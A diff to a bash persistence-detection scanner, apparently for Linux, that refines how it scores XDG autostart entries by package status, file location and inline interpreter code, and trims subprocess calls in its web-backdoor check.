+                                    log_finding "XDG autostart interpreter script is modified package file: $xdg_script"
+                                elif [[ "$script_pkg_status" != "unmanaged" ]]; then
+                                    if [[ -n "$xdg_never_wl_match" ]]; then
+                                        confidence="HIGH"
+                                        finding_matched_pattern="never_whitelist"
+                                        finding_matched_string="$xdg_never_wl_match"
+                                        log_finding "XDG autostart: package-verified script with never-whitelist pattern: $xdg_never_wl_match"
+                                    else
+                                        confidence="LOW"
+                                        skip_pattern_analysis=true
+                                    fi
+                                else
+                                    if [[ "$xdg_script" =~ ^/(tmp|dev/shm|var/tmp) ]]; then
+                                        confidence="HIGH"
+                                        finding_matched_pattern="suspicious_location"
+                                        finding_matched_string="$xdg_script"
+                                        log_finding "XDG autostart script in suspicious location: $xdg_script"
+                                    elif is_script "$xdg_script" && analyze_script_content "$xdg_script"; then
+                                        confidence="HIGH"
+                                        finding_matched_pattern="suspicious_script_content"
+                                        finding_matched_string="$MATCHED_STRING"
+                                        log_finding "XDG autostart script contains suspicious content: $xdg_script"
+                                    else
+                                        confidence="MEDIUM"
+                                    fi
+                                    if [[ -z "$finding_matched_pattern" ]]; then
+                                        finding_matched_pattern="unmanaged_script"
+                                        finding_matched_string="$xdg_script"
+                                    fi
+                                fi
+                            else
+                                # Interpreter with no script arg — check for inline code
+                                if [[ "$exec_line" =~ \ -[ce]\  ]] || [[ "$exec_line" =~ \ -[ce]$ ]]; then
+                                    if analyze_inline_code "$exec_line"; then
+                                        confidence="CRITICAL"
+                                        finding_matched_pattern="inline_code_suspicious"
+                                        finding_matched_string="$INLINE_CODE_REASON"
+                                        log_finding "XDG autostart has suspicious inline code: $desktop_file"
+                                    else
+                                        confidence="HIGH"
+                                        finding_matched_pattern="inline_code"
+                                        finding_matched_string="-c/-e flag"
+                                        log_finding "XDG autostart uses interpreter with inline code: $desktop_file"
+                                    fi
+                                fi
+                            fi
+
+                        else
+                            # BRANCH 2: Direct binary execution
+                            local exec_pkg_status
+                            exec_pkg_status=$(is_package_managed "$xdg_executable") || true
+
+                            if [[ "$exec_pkg_status" == *":MODIFIED" ]]; then
+                                confidence="CRITICAL"
+                                finding_matched_pattern="modified_binary"
+                                finding_matched_string="$xdg_executable"
+                                log_finding "XDG autostart executes modified package binary: $xdg_executable"
+                            elif [[ "$exec_pkg_status" != "unmanaged" ]]; then
+                                if [[ -n "$xdg_never_wl_match" ]]; then
+                                    confidence="HIGH"
+                                    finding_matched_pattern="never_whitelist"
+                                    finding_matched_string="$xdg_never_wl_match"
+                                    log_finding "XDG autostart: package-verified binary with never-whitelist pattern: $xdg_never_wl_match"
+                                else
+                                    confidence="LOW"
+                                    skip_pattern_analysis=true
+                                fi
+                            else
+                                if [[ "$xdg_executable" =~ ^/(tmp|dev/shm|var/tmp) ]]; then
+                                    confidence="HIGH"
+                                    finding_matched_pattern="suspicious_location"
+                                    finding_matched_string="$xdg_executable"
+                                    log_finding "XDG autostart executes binary from suspicious location: $xdg_executable"
+                                elif is_script "$xdg_executable" && analyze_script_content "$xdg_executable"; then
+                                    confidence="HIGH"
+                                    finding_matched_pattern="suspicious_script_content"
+                                    finding_matched_string="$MATCHED_STRING"
+                                    log_finding "XDG autostart script has suspicious content: $xdg_executable"
+                                fi
+                                if [[ -z "$finding_matched_pattern" ]]; then
+                                    finding_matched_pattern="unmanaged_binary"
+                                    finding_matched_string="${exec_line:0:200}"
+                                fi
+                            fi
+                        fi
+
+                    else
+                        # Executable not found — fall back to pattern check on the Exec= line
+                        if quick_suspicious_check "$exec_line"; then
+                            confidence="HIGH"
+                            finding_matched_pattern="$MATCHED_PATTERN"
+                            finding_matched_string="$MATCHED_STRING"
+                            log_finding "Suspicious XDG autostart pattern: $desktop_file"
+                        else
+                            finding_matched_pattern="unresolved_executable"
+                            finding_matched_string="${xdg_executable:-$exec_line}"
+                        fi
+                    fi
+
+                    # Final pattern sweep on the raw Exec= line if not already flagged
+                    if [[ "$skip_pattern_analysis" != true ]] && [[ "$confidence" != "HIGH" ]] && [[ "$confidence" != "CRITICAL" ]]; then
+                        if quick_suspicious_check "$exec_line"; then
+                            confidence="HIGH"
+                            finding_matched_pattern="$MATCHED_PATTERN"
+                            finding_matched_string="$MATCHED_STRING"
+                            log_finding "Suspicious XDG autostart pattern: $desktop_file"
+                        fi
+                    fi
                 fi
 
                 add_finding "Autostart" "XDG" "xdg_autostart" "$desktop_file" "XDG autostart: $(basename "$desktop_file") | Exec: $exec_line" "$confidence" "$hash" "$metadata" "" "$finding_matched_pattern" "$finding_matched_string"
@@ -3298,9 +3832,10 @@ check_common_backdoors() {
                 local hash=$(get_file_hash "$web_file")
                 local metadata=$(get_file_metadata "$web_file")
 
-                # Check modification time
-                local mod_time=$(stat -c %Y "$web_file" 2>/dev/null || stat -f %m "$web_file" 2>/dev/null || echo "0")
-                local current_time=$(date +%s)
+                # Extract mod_time from already-fetched metadata (no extra stat fork)
+                local mod_time=0
+                [[ "$metadata" =~ modified:([0-9]+) ]] && mod_time="${BASH_REMATCH[1]}"
+                local current_time=$SCAN_EPOCH
                 local days_old=$(( (current_time - mod_time) / 86400 ))
 
                 local confidence="LOW"
@@ -3407,6 +3942,9 @@ main() {
 
     # Build combined patterns for optimized matching (performance optimization)
     build_combined_patterns
+
+    # Capture scan epoch once — avoids date +%s subprocess calls inside per-file loops
+    SCAN_EPOCH=$(date +%s)
     echo
 
     # Run detection modules
